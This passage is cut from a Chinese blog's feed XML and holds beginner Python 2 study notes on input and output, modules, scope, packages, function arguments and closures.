class="comment">#输出不换行，多加个逗号即可</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'LOVE YOU'</span></span><br></pre></td></tr></table></figure><h3 id="0x02-输入"><a href="#0x02-输入" class="headerlink" title="0x02 输入"></a>0x02 输入</h3><p>Input()和raw_input()  区别：</p><ul><li><p>查看Input源码发现input也是调用了raw_input，只是做了eval处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(prompt)</span>:</span></span><br><span class="line"><span class="keyword">return</span> eval(raw_input(prompt))</span><br></pre></td></tr></table></figure></li><li><p>raw_input：它把所有的输入都直接当作一串字符，于是就可以不用加引号，只保留原始的输入，不作其他（特殊）处理，所以所得到的输入都是字符串</p></li><li>input：会去做额外的处理，比如 1 + 2，其会帮你去计算为3，而不是字符串本身的“1+2”。对应的，想要输入字符串的话，也就要自己加上对应的引号，表示所输入的是字符串类型的值了。因此总的来说一句话就是输入为数字时应该为input，输入字符串时用raw_input</li></ul><h3 id="0x03-密码输入"><a href="#0x03-密码输入" class="headerlink" title="0x03 密码输入"></a>0x03 密码输入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line">user = getpass.getuser()</span><br><span class="line">pwd = getpass.getpass(<span class="string">"enter password for user %s: "</span> % user)</span><br><span class="line"><span class="keyword">print</span> user, pwd</span><br></pre></td></tr></table></figure><h3 id="0x04-输出重定向"><a href="#0x04-输出重定向" class="headerlink" title="0x04 输出重定向"></a>0x04 输出重定向</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="keyword">print</span> <span class="string">'\hello\' &gt; dota.py</span></span><br><span class="line"><span class="string"> #命令行输出重定向 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">with open('</span><span class="number">1.</span>txt<span class="string">','</span>a+<span class="string">') as fr: </span></span><br><span class="line"><span class="string">    print &gt;&gt; fr,'</span>dota<span class="string">' </span></span><br><span class="line"><span class="string">     # print输出重定向</span></span><br></pre></td></tr></table></figure><h3 id="0x05-遇到print即换行"><a href="#0x05-遇到print即换行" class="headerlink" title="0x05 遇到print即换行"></a>0x05 遇到print即换行</h3><p>单独输出一个print 和print ‘\n’效果一样</p><h3 id="0x06-pprint格式化输出"><a href="#0x06-pprint格式化输出" class="headerlink" title="0x06 pprint格式化输出"></a>0x06 pprint格式化输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line">pprint xxxx</span><br></pre></td></tr></table></figure><h2 id="六、Python模块"><a href="#六、Python模块" class="headerlink" title="六、Python模块"></a>六、Python模块</h2><h3 id="0x01-导入模块-模块如果在顶层导入则作用域是全局的，如果在函数中导入是局部的。"><a href="#0x01-导入模块-模块如果在顶层导入则作用域是全局的，如果在函数中导入是局部的。" class="headerlink" title="0x01 导入模块 [ 模块如果在顶层导入则作用域是全局的，如果在函数中导入是局部的。]"></a>0x01 导入模块 [ 模块如果在顶层导入则作用域是全局的，如果在函数中导入是局部的。]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> module,module2,module3                    <span class="comment">#正常导入，相当于拿车</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> module <span class="keyword">import</span> name,name2,name3 / *      <span class="comment">#从模块中导入对应的模块属性，相当于从车里拿水，面包等。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> visiturl            <span class="comment">#当导入的模块名字长，你不喜欢或者导入的模块或者模块的属性已经在代码中使用</span></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get <span class="keyword">as</span> dota</span><br></pre></td></tr></table></figure><ul><li>注意点1：<br>不建议from module import *，因为这样有时会污染名称空间，比如导入的模块中的一个函数名跟当前代码中函数名冲突，这样就会被污染；那么为什么import module也是导入全部属性不会被污染呢，因为import module导入后访问属性是通过模块名.属性，从而避免了名称空间冲突。<br>比如：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(x)</span>:</span> </span><br><span class="line">x = x+<span class="number">1</span> </span><br><span class="line"><span class="keyword">print</span> x </span><br><span class="line">a=get(<span class="number">2</span>)</span><br><span class="line">输出则为<span class="number">3</span>，即先执行了导入语句，但是接下来的函数名冲突覆盖了，导致get属性功能变了。</span><br><span class="line"></span><br><span class="line">* 注意点<span class="number">2</span>：  一个模块导入只被加载一次，比如你导入了很多次<span class="keyword">import</span> sys，其次他只执行一次；但是如果你想重新导入一个已经存在的模块，可以使用内置重载函数</span><br></pre></td></tr></table></figure></li></ul><p>reload(sys)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">即:这个模块被重新导入了一次，不过需要注意的是使用reloads时候，前提该模块已经<span class="keyword">import</span> module过。</span><br><span class="line">* 注意点<span class="number">3</span>：</span><br><span class="line">如果有特殊情况，在函数中导入相关模块的话，意味着导入的这个模块只适用在当前这个函数的作用域，局部变量。其次意味着只有执行了这个函数才会导入这个模块，否则不会导入。</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><ul><li><p>注意点4：人性化的优雅导入模块，优雅报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'您缺少pymongo，请输入pip install pymongo安装。'</span></span><br></pre></td></tr></table></figure></li><li><p>注意点5：<br>Python寻找模块的顺序<br>当前进程根目录&gt;pythonpaht环境变量指定路径&gt;python标准库列表&gt;路径文件(.pth）保存的目录。 </p></li><li>注意点6：<br>嵌套导入<br>比如我在A中导入了全部B，B中存在的模块即被我导入了，我就可以在A中使用B的模块。</li></ul><h3 id="0x02-作用域"><a href="#0x02-作用域" class="headerlink" title="0x02 作用域"></a>0x02 作用域</h3><p>locals()和globals()分别返回调用者局部和全局名称空间的字典。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>): </span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>): </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span>(globals()[<span class="string">"a%d%d"</span> % (g, h)] == <span class="number">0</span>):</span><br><span class="line">count=count+<span class="number">1</span></span><br><span class="line">ps:[<span class="string">"a%d%d"</span> % (g, h)]==<span class="number">0</span>就相当于在&#123;全局变量这个字典中&#125;[<span class="string">"agh"</span>] == <span class="number">0</span></span><br><span class="line">比如：<span class="keyword">print</span> globals()的全局变量是&#123;<span class="string">'a11'</span>:<span class="number">0</span>&#125;，这样他就确定到了a11的value是否是<span class="number">0</span>，判断其是否在全局变量中</span><br></pre></td></tr></table></figure></p><h3 id="0x03-包"><a href="#0x03-包" class="headerlink" title="0x03 包"></a>0x03 包</h3><p>包就是是一个包含<strong>init</strong>.py 文件(这个文件定义了包的属性和方法)的目录，该目录下一定得有这个 <strong>init</strong>.py文件和其它模块或子包,当一个包作为模块导入的时候，实际上导入了它的init.py文件，假如init.py为空，那么仅仅导入包是什么都做不了的。如果采用from package.module import *的话，我们就要在<strong>init</strong>.py中加入<strong>all</strong>变量，从而使不同的操作系统在完全导入的时候能自己来取决不同操作系统对应的文件。</p><h3 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h3><p>sys.path.append() 添加模块路径列表<br>sys.modules 查看所有模块以及路径，返回字典<br>from <strong>future</strong> import 你希望的新功能 ，虽然可以写 import future 但是没用，因此只能采用 from … import …形式。<br>如果pip安装失败，可以试试apt-get install python-xxxx</p><h2 id="七、Python函数"><a href="#七、Python函数" class="headerlink" title="七、Python函数"></a>七、Python函数</h2><h3 id="0x01-简介-1"><a href="#0x01-简介-1" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>函数就是为了方便重复使用相同的一段程序。比如:我们去餐厅吃饭，跟服务员点了菜，过了一会儿，服务员把做好的菜端上来。餐厅的厨房就可以看作是一个函数，我们点的菜单，就是给这个函数的参数；厨师在厨房里做菜的过程就是这个函数的执行过程；做好的菜是返回结果，返回到我们的餐桌上。换个例子函数也就是个你招来的工人。你给他一些材料，告诉他怎么用这些材料拼装，然后他负责把拼装好的成品交给你。 材料就是函数的参数，成品是函数的输出，而怎么拼装就是你写的函数体代码了。</p><h3 id="0x02-定义函数"><a href="#0x02-定义函数" class="headerlink" title="0x02 定义函数"></a>0x02 定义函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dota</span><span class="params">( parameters )</span>:</span></span><br><span class="line"><span class="string">"函数_文档字符串"</span></span><br><span class="line">function_suite</span><br><span class="line"><span class="keyword">return</span> [expression]</span><br></pre></td></tr></table></figure><p>定义函数时，前提确定函数名和参数个数；如果有必要，可以先对参数的数据类型做检查。函数中任何地方的return被执行到的时候，这个函数就会结束，停止执行函数内余下的语句。return并不是必须的，当没有return,或者return后面没有返回值时，函数将自动返回None; return也可以返回多个值，用逗号分隔，相当于返回一个tuple。return语句就是将结果返回到调用的地方，并把程序控制权一起返回。</p><h3 id="0x03-常用内置函数"><a href="#0x03-常用内置函数" class="headerlink" title="0x03 常用内置函数"></a>0x03 常用内置函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">abs(<span class="number">-1</span>)</span><br><span class="line">max([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">min([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">round(<span class="number">1</span>)//<span class="number">1.0</span></span><br><span class="line">dir(xx)</span><br><span class="line">type(s)</span><br><span class="line">callable(funcname)     <span class="comment">#判断函数是否可调用</span></span><br><span class="line">isinstance(x,list/int)     <span class="comment">#判断类型</span></span><br><span class="line">cmp(<span class="string">'dota'</span>,<span class="string">'dota'</span>)        <span class="comment">#比较</span></span><br><span class="line">zip()</span><br><span class="line"><span class="number">1.</span>  zip函数同时遍历两个数组</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>B=[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bb=zip(A,B)</span><br><span class="line">&lt;zip object at <span class="number">0x01EF08F0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> bb:</span><br><span class="line">print(i)</span><br><span class="line">(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="number">6</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i,v <span class="keyword">in</span> bb:</span><br><span class="line">print(i,v)</span><br><span class="line">-----------------------------------</span><br><span class="line"><span class="number">2.</span>   通过zip构造字典</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>key=[<span class="string">'username'</span>,<span class="string">'pwd'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>values=[<span class="string">'nini'</span>,<span class="string">'1qaz'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bb=dict(zip(key,values))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(bb)</span><br><span class="line">&#123;<span class="string">'pwd'</span>: <span class="string">'1qaz'</span>, <span class="string">'username'</span>: <span class="string">'nini'</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="0x04-函数参数"><a href="#0x04-函数参数" class="headerlink" title="0x04 函数参数"></a>0x04 函数参数</h3><ul><li><p>关键字参数<br>调用时指定参数的名称，且与函数声明时的参数名称一致。使用关键字参数允许函数调用时参数的顺序与声明时不一致，仅根据参数的指定进行赋值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(x, y)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'x is %s'</span> % x</span><br><span class="line"><span class="keyword">print</span> <span class="string">'y is %s'</span> % y</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>)                        <span class="comment"># 标准调用</span></span><br><span class="line">foo(y = <span class="number">1</span>, x = <span class="number">2</span>)            <span class="comment"># 关键字调用</span></span><br></pre></td></tr></table></figure></li><li><p>默认参数<br>在函数声明时，指定形参的默认值，调用时可不传入改参数（使用默认值)。<br>为什么需要默认参数，比如程序员遇到刚拿到的api接口传入的参数不太确定时候就可以使用默认参数，默认参数就像安装软件那样，很多情况你对这个软件功能不太明白情况下都是采用默认安装。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tax</span><span class="params">(cost, rate = <span class="number">0.17</span>)</span>:</span></span><br><span class="line"><span class="keyword">print</span> cost * (<span class="number">1</span> + rate) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">tax(<span class="number">1000</span>)                 <span class="comment"># rate使用默认值0.17</span></span><br><span class="line">tax(<span class="number">1000</span>, <span class="number">0.05</span>)        <span class="comment"># rate指定为0.05</span></span><br></pre></td></tr></table></figure></li><li><p>非关键字可变长参数（元组）F(arg1)<br>上面俩个方式是有多少个形参，就传进去多少个实参，但有时候会不确定有多少个参数，则此时第三种方式就比较有用，它以一个加上形参名的方式来表示这个函数的实参个数不定，可能为0个也可能为n个。注意一点是，不管有多少个，在函数内部都被存放在以形参名为标识符的元组中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(*x)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(x) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'None'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">&gt;&gt;&gt;a(<span class="number">1</span>)</span><br><span class="line">(<span class="number">1</span>,)    <span class="comment">#存放在元组中</span></span><br><span class="line">&gt;&gt;&gt;a(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a(m=<span class="number">1</span>,y=<span class="number">2</span>,z=<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">"&lt;pyshell#16&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> -toplevel</span><br><span class="line">a(m=<span class="number">1</span>,y=<span class="number">2</span>,z=<span class="number">3</span>)</span><br><span class="line">TypeError: a() got an unexpected keyword argument <span class="string">'m'</span></span><br></pre></td></tr></table></figure></li><li><p>关键字可变长参数（字典） F(*<em>arg1)  形参名前加俩个</em>表示，参数在函数内部将被存放在以形式名为标识符的字典中，这时调用函数的方法则需要采用arg1=value1,arg2=value2这样的形式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(**x)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(x) ==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'None'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">&gt;&gt;&gt;&gt; a()</span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a(x=<span class="number">1</span>,y=<span class="number">2</span>)</span><br><span class="line">&#123;<span class="string">'y'</span>:<span class="number">2</span>,<span class="string">'x'</span>:<span class="string">'1'</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>各种参数调用的顺序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dota</span><span class="params">(a,b=<span class="number">1</span>,*c,**d)</span>:</span></span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p>向函数中传入元组和字典对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newfoo(<span class="number">2</span>, <span class="number">4</span>, *(<span class="number">6</span>, <span class="number">8</span>), **&#123;<span class="string">'foo'</span>: <span class="number">10</span>, <span class="string">'bar'</span>: <span class="number">12</span>&#125;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x05-函数对象-vs-函数调用"><a href="#0x05-函数对象-vs-函数调用" class="headerlink" title="0x05 函数对象 vs 函数调用"></a>0x05 函数对象 vs 函数调用</h3><p>无论是把函数赋值给新的标识符，还是作为参数传递给新的函数，针对的都是函数对象本身，而不是函数的调用。用一个更加简单，但从外观上看，更容易产生混淆的例子来说明这个问题。例如定义了下面这个函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"hello,world"</span></span><br><span class="line">ref1 = func             <span class="comment">#将函数对象赋值给ref1</span></span><br><span class="line">ref2 = func()           <span class="comment">#调用函数，函数的返回值赋值给ref1</span></span><br><span class="line">type(ref1)</span><br><span class="line">function</span><br><span class="line">type(ref2)</span><br><span class="line">str</span><br><span class="line">通过内建的callable函数，可以进一步验证ref1是可调用的，而ref2是不可调用的,</span><br><span class="line">callable(ref1)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">callable(ref2)</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure></p><h3 id="0x06-内嵌函数"><a href="#0x06-内嵌函数" class="headerlink" title="0x06 内嵌函数"></a>0x06 内嵌函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dota1</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'do dota1'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dota2</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'do dota2'</span></span><br><span class="line">dota2()</span><br><span class="line">f = dota1()</span><br></pre></td></tr></table></figure><h3 id="0x07-闭包"><a href="#0x07-闭包" class="headerlink" title="0x07 闭包"></a>0x07 闭包</h3><p>要形成闭包，首先得有一个嵌套的函数，即函数中定义了另一个函数，闭包则是一个集合，它包括了外部函数的局部变量，这些局部变量在外部函数返回后也继续存在，并能被内部函数引用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dota1</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dota2</span><span class="params">(y)</span>:</span></span><br><span class="line"><span class="keyword">return</span> x+y</span><br><span class="line"><span class="keyword">return</span> dota2</span><br><span class="line">dota = dota1(<span class="number">1</span>)(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> dota</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;四、Python异常处理&quot;&gt;&lt;a href=&quot;#四、Python异常处理&quot; class=&quot;headerlink&quot; title=&quot;四、Python异常处理&quot;&gt;&lt;/a&gt;四、Python异常处理&lt;/h2&gt;&lt;h3 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;异常处理就是为了防止程序运行异常时候结束掉了整个程序，比如你访问一个网站，访问不通了，这种情况出现异常导致程序被结束你肯定不希望，所以用try…except..进行捕获异常，对异常进行处理，目的就是不想在异常发生时结束了程序，所以需要在try中捕获。当我们认为某些代码可能会出错时，就可以用try来运行这段代码，如果执行出错，则后续代码不会继续执行，而是直接跳转至错误处理代码，即except语句块， 执行完except后，如果有ﬁnally语句块，则执行ﬁnally语句块。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;0x02-格式&quot;&gt;&lt;a href=&quot;#0x02-格式&quot; class=&quot;headerlink&quot; title=&quot;0x02 格式&quot;&gt;&lt;/a&gt;0x02 格式&lt;/h3&gt;
    
    </summary>
    
      <category term="Python" scheme="https://dayu.ink/categories/Python/"/>
    
    
      <category term="Python" scheme="https://dayu.ink/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python基础学习笔记(一)</title>
    <link href="https://dayu.ink/PythonBasicStudyNotes1.html"/>
    <id>https://dayu.ink/PythonBasicStudyNotes1.html</id>
    <published>2017-08-27T11:28:24.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、Python基础"><a href="#一、Python基础" class="headerlink" title="一、Python基础"></a>一、Python基础</h2><h3 id="0x01-运行机制"><a href="#0x01-运行机制" class="headerlink" title="0x01 运行机制"></a>0x01 运行机制</h3><ul><li>python解释型语言，因此在运行时解释器将源码转换为字节码，然后再由解释器来执行这些字节码。虚拟机执行脚本:1.完成模块的加载和链接；2.将源代码翻译为PyCodeObject对象（这货就是字节码），并将其写入内存当中（方便CPU读取，起到加速程序运行的作用）；3.从上述内存空间中读取指令并执行；4. 程序结束后，根据命令行调用情况（即运行程序的方式）决定是否将PyCodeObject写回硬盘当中（也就是 直接复制到.pyc或.pyo文件中）；5.之后若再次执行该脚本，则先检查本地是否有上述字节码文件。有则执行，否则重复上述步骤。</li></ul><a id="more"></a><h3 id="0x02-usr-bin-env-python-和-usr-bin-python"><a href="#0x02-usr-bin-env-python-和-usr-bin-python" class="headerlink" title="0x02 !/usr/bin/env python 和 #!/usr/bin/python"></a>0x02 !/usr/bin/env python 和 #!/usr/bin/python</h3><ul><li>#! /usr/bin/env python是防止用户没有把python安装在默认路径，它执行过程就是先到env设置中查找 python路径，然后调出对应解释器。而/usr/bin/python就是固定死了python的路径。一般推荐#!/usr/bin/env python 然后保存好之后在目录下chmod a+x hello.py，然后直接就可以运行啦。  其次加不加这个头有一个明显区别，如果加了这个头，运行xxx.py可以切到目录下直接./xx.py，如果没有加 这个头则需要python ./xxx.py</li></ul><h3 id="0x03-if-name-‘main’-的解析"><a href="#0x03-if-name-‘main’-的解析" class="headerlink" title="0x03 if name == ‘main’: 的解析"></a>0x03 if name == ‘main’: 的解析</h3><ul><li>首先 if <strong>name</strong>==“<strong>main</strong>“ :是 程序的入口。</li><li>在python中，当一个module作为整体被执行时, moduel.<strong>name</strong> 的值将是 ”<strong>main</strong>” ；而当 一个module被其它module引用时， module.<strong>name</strong> 将是module自己的名字，当然一个module被 其它module引用时，其本身并不需要一个可执行的入口main了。可以说python中的这种用法很灵活 啊。（用于判断是不是本身执行的还是被别人导入的，如果是别人导入的话就执行就起到函数调用作 用，不会执行导入模块，这样好处就是我导入了你，但是我不想要你的输出，我只想要你模块里面部分 内容。如果不这样我导入了你你还输出显示我不想要的内容。）</li><li>用来检测该文件代码是否是主程序文件，也即非模块。从而可以避免执行不必要代码。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代码1 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"test is running"</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"test main is working"</span></span><br><span class="line"><span class="comment">#代码2：</span></span><br><span class="line"><span class="keyword">import</span> untitled</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">untitled.run()</span><br></pre></td></tr></table></figure></li></ul><p>如果是代码1单独运行的话下面的print会输出，但是如果被代码2导入的话，他只执行函数体，不执行if <strong>name</strong> 下面的。是用来检测该文件代码是否是主程序文件，也即非模块</p><ul><li>最简单理解这个问题就是 print  <strong>name</strong> ,如果是直接执行，那么 <strong>name</strong> 的值就是 <strong>main</strong> 。如果是被调用的执行的话，则值是被调用的那个脚本的名称。</li></ul><h3 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h3><ul><li>当语句以：结尾时，缩进的语句视为代码块。缩进有利有弊。好处是强迫你写出格式化的代码，但没有规定缩进是几个空格还是Tab。按照约定俗成的管理，应该始终坚持使用4个空格的缩进。缩进的另一个好处是强迫你写出缩进较少的代码，你会倾向于把一段很长的代码拆分成若干函数，从而得到缩进较少的代码。</li><li>Python程序是大小写敏感的，如果写错了大小写，程序会报错。</li><li>Python中的变量不需要声明，可以直接输入：a=10;那么你的内存里就有了一个变量a， 它的值是10， 它的类型是integer (整数)。 在此之前你不需要做什么特别的声明，而数据类型是Python自动决定的。</li></ul><h2 id="二、Python数据类型"><a href="#二、Python数据类型" class="headerlink" title="二、Python数据类型"></a>二、Python数据类型</h2><h3 id="0x01-列表"><a href="#0x01-列表" class="headerlink" title="0x01 列表"></a>0x01 